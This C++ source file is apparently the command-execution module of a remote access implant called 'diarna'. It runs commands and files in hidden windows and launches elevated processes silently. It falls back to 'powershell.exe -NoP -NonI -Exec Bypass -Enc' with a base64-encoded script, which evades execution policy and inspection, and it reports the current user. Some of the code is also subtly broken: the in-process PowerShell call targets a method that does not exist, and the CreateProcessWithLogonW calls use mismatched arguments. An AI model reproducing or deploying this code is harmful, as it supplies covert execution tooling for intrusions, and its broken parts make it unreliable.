#include <diarna/compiler_port.hpp>
#include <diarna/exec/executor.hpp>
#include <diarna/stealth/syscalls.hpp>
#include <cstring>

#ifdef DIARNA_MSVC
#include <mscoree.h>
#include <metahost.h>
#endif

namespace diarna::exec {

#ifdef DIARNA_MSVC
PowerShellRunner::PowerShellRunner() : clr_host_(nullptr), initialized_(false) {}

PowerShellRunner::~PowerShellRunner() {
    if (clr_host_) {
        auto host = static_cast<ICLRRuntimeHost*>(clr_host_);
        host->Stop();
        host->Release();
    }
}

bool PowerShellRunner::initialize() {
    if (initialized_) return true;
    HMODULE mscoree = GetModuleHandleW(L"mscoree.dll");
    if (!mscoree) mscoree = LoadLibraryW(L"mscoree.dll");
    if (!mscoree) return false;

    using CLRCreateInstanceFn = HRESULT(WINAPI*)(REFCLSID, REFIID, LPVOID*);
    auto CLRCreateInstance = reinterpret_cast<CLRCreateInstanceFn>(
        GetProcAddress(mscoree, "CLRCreateInstance"));
    if (!CLRCreateInstance) return false;

    ICLRMetaHost* metahost = nullptr;
    HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                                    reinterpret_cast<LPVOID*>(&metahost));
    if (FAILED(hr)) return false;
    ICLRRuntimeInfo* runtime = nullptr;
    hr = metahost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<LPVOID*>(&runtime));
    metahost->Release();
    if (FAILED(hr)) return false;
    ICLRRuntimeHost* host = nullptr;
    hr = runtime->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, reinterpret_cast<LPVOID*>(&host));
    runtime->Release();
    if (FAILED(hr)) return false;
    hr = host->Start();
    if (FAILED(hr)) { host->Release(); return false; }
    clr_host_ = host;
    initialized_ = true;
    return true;
}

std::string PowerShellRunner::execute(const std::string& script) {
    if (!initialized_) return "";
    auto host = static_cast<ICLRRuntimeHost*>(clr_host_);
    DWORD ret = 0;
    std::wstring wscript(script.begin(), script.end());
    HRESULT hr = host->ExecuteInDefaultAppDomain(
        L"System.Management.Automation.dll", L"System.Management.Automation.PowerShell",
        L"ExecuteScript", wscript.c_str(), &ret);
    if (FAILED(hr)) return "[CLR failed]";
    return "[OK] exit=" + std::to_string(ret);
}

bool PowerShellRunner::is_available() const { return initialized_; }
#else
PowerShellRunner::PowerShellRunner() : clr_host_(nullptr), initialized_(false) {}
PowerShellRunner::~PowerShellRunner() {}
bool PowerShellRunner::initialize() { return false; }
std::string PowerShellRunner::execute(const std::string&) { return ""; }
bool PowerShellRunner::is_available() const { return false; }
#endif

// ====== EXECUTOR ======

Executor::Result Executor::execute(const std::string& command,
                                     std::chrono::milliseconds timeout) {
    Result r{}; r.timed_out = false;
    auto start = std::chrono::steady_clock::now();

    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
    HANDLE stdout_r = nullptr, stdout_w = nullptr;
    HANDLE stderr_r = nullptr, stderr_w = nullptr;
    HANDLE stdin_r = nullptr, stdin_w = nullptr;

    CreatePipe(&stdout_r, &stdout_w, &sa, 0);
    CreatePipe(&stderr_r, &stderr_w, &sa, 0);
    CreatePipe(&stdin_r, &stdin_w, &sa, 0);

    SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stderr_r, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stdin_w, HANDLE_FLAG_INHERIT, 0);

    int cmd_len = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, nullptr, 0);
    std::wstring wcmd(cmd_len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, wcmd.data(), cmd_len);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = stdout_w;
    si.hStdError = stderr_w;
    si.hStdInput = stdin_r;

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(nullptr, wcmd.data(), nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        r.exit_code = 1;
        r.timed_out = true;
    } else {
        CloseHandle(stdout_w); stdout_w = nullptr;
        CloseHandle(stderr_w); stderr_w = nullptr;
        CloseHandle(stdin_r); stdin_r = nullptr;
        CloseHandle(pi.hThread);

        DWORD wait = WaitForSingleObject(pi.hProcess, (DWORD)timeout.count());
        if (wait == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            r.exit_code = 1; r.timed_out = true;
        } else {
            DWORD ec = 0;
            GetExitCodeProcess(pi.hProcess, &ec);
            r.exit_code = ec;
        }

        char buf[8192]; DWORD avail = 0;
        while (PeekNamedPipe(stdout_r, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
            DWORD rd = 0;
            if (ReadFile(stdout_r, buf, (sizeof(buf) - 1 < avail ? (sizeof(buf) - 1) : avail), &rd, nullptr))
                r.stdout_data.append(buf, rd);
        }
        while (PeekNamedPipe(stderr_r, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
            DWORD rd = 0;
            if (ReadFile(stderr_r, buf, (sizeof(buf) - 1 < avail ? (sizeof(buf) - 1) : avail), &rd, nullptr))
                r.stderr_data.append(buf, rd);
        }
        CloseHandle(pi.hProcess);
    }

    if (stdout_r) CloseHandle(stdout_r);
    if (stderr_r) CloseHandle(stderr_r);
    if (stdin_w) CloseHandle(stdin_w);

    auto end = std::chrono::steady_clock::now();
    r.duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    return r;
}

Executor::Result Executor::execute_powershell(const std::string& script,
                                                std::chrono::milliseconds timeout) {
    PowerShellRunner ps;
    if (ps.initialize()) {
        Result r{};
        auto start = std::chrono::steady_clock::now();
        r.stdout_data = ps.execute(script);
        r.exit_code = 0;
        auto end = std::chrono::steady_clock::now();
        r.duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        return r;
    }

    std::wstring wscript(script.begin(), script.end());
    std::vector<uint8_t> bytes(wscript.size() * sizeof(wchar_t));
    memcpy(bytes.data(), wscript.data(), bytes.size());

    DWORD b64_len = 0;
    CryptBinaryToStringW(bytes.data(), (DWORD)bytes.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64_len);
    std::wstring b64(b64_len, L'\0');
    CryptBinaryToStringW(bytes.data(), (DWORD)bytes.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64.data(), &b64_len);
    b64.resize(b64_len);

    std::wstring cmd = L"powershell.exe -NoP -NonI -Exec Bypass -Enc " + b64;

    int alen = WideCharToMultiByte(CP_UTF8, 0, cmd.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string acmd(alen, '\0');
    WideCharToMultiByte(CP_UTF8, 0, cmd.c_str(), -1, acmd.data(), alen, nullptr, nullptr);
    acmd.resize(alen - 1);

    return execute(acmd, timeout);
}

Executor::Result Executor::execute_as_user(const std::string& command,
                                             const std::string& user,
                                             const std::string& pass,
                                             std::chrono::milliseconds timeout) {
    Result r{}; r.timed_out = false;
    auto start = std::chrono::steady_clock::now();

    int cl = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, nullptr, 0);
    std::wstring wcmd(cl, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, wcmd.data(), cl);

    int ul = MultiByteToWideChar(CP_UTF8, 0, user.c_str(), -1, nullptr, 0);
    std::wstring wuser(ul, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, user.c_str(), -1, wuser.data(), ul);

    int pl = MultiByteToWideChar(CP_UTF8, 0, pass.c_str(), -1, nullptr, 0);
    std::wstring wpass(pl, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, pass.c_str(), -1, wpass.data(), pl);

    HANDLE stdout_r, stdout_w, stderr_r, stderr_w;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
    CreatePipe(&stdout_r, &stdout_w, &sa, 0);
    CreatePipe(&stderr_r, &stderr_w, &sa, 0);
    SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stderr_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = stdout_w;
    si.hStdError = stderr_w;

    PROCESS_INFORMATION pi = {};
#ifdef DIARNA_MSVC
    BOOL ok = CreateProcessWithLogonW(wuser.c_str(), nullptr, wcmd.data(),
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
#else
    STARTUPINFOW si_m = {sizeof(si_m)}; si_m.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si_m.wShowWindow = SW_HIDE; si_m.hStdOutput = stdout_w; si_m.hStdError = stderr_w;
    BOOL ok = CreateProcessWithLogonW(wuser.c_str(), nullptr, wpass.c_str(),
        0x00000001, nullptr, wcmd.data(), CREATE_NO_WINDOW, nullptr, nullptr, &si_m, &pi);
#endif
    CloseHandle(stdout_w); CloseHandle(stderr_w);

    if (!ok) {
        r.exit_code = 1; r.timed_out = true;
    } else {
        WaitForSingleObject(pi.hProcess, (DWORD)timeout.count());
        DWORD ec2 = 0; GetExitCodeProcess(pi.hProcess, &ec2); r.exit_code = ec2;
        char buf[8192]; DWORD avail = 0;
        while (PeekNamedPipe(stdout_r, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
            DWORD rd = 0;
            if (ReadFile(stdout_r, buf, (sizeof(buf) - 1 < avail ? (sizeof(buf) - 1) : avail), &rd, nullptr))
                r.stdout_data.append(buf, rd);
        }
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    CloseHandle(stdout_r); CloseHandle(stderr_r);

    auto end = std::chrono::steady_clock::now();
    r.duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    return r;
}

bool Executor::run_file(const std::wstring& path, const std::wstring& args, bool hidden) {
    SHELLEXECUTEINFOW sei = {sizeof(sei)};
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = path.c_str();
    sei.lpParameters = args.empty() ? nullptr : args.c_str();
    sei.nShow = hidden ? SW_HIDE : SW_SHOWNORMAL;
    if (!ShellExecuteExW(&sei)) return false;
    if (sei.hProcess) CloseHandle(sei.hProcess);
    return true;
}

bool Executor::run_file_elevated(const std::wstring& path, const std::wstring& args) {
    SHELLEXECUTEINFOW sei = {sizeof(sei)};
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = path.c_str();
    sei.lpParameters = args.empty() ? nullptr : args.c_str();
    sei.nShow = SW_HIDE;
    if (!ShellExecuteExW(&sei)) return false;
    if (sei.hProcess) { WaitForSingleObject(sei.hProcess, INFINITE); CloseHandle(sei.hProcess); }
    return true;
}

std::string Executor::whoami() {
    wchar_t buf[256]; DWORD sz = 256;
    GetUserNameW(buf, &sz);
    int len = WideCharToMultiByte(CP_UTF8, 0, buf, -1, nullptr, 0, nullptr, nullptr);
    std::string r(len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, r.data(), len, nullptr, nullptr);
    r.resize(len - 1);
    return r;
}

} // namespace diarna::exec
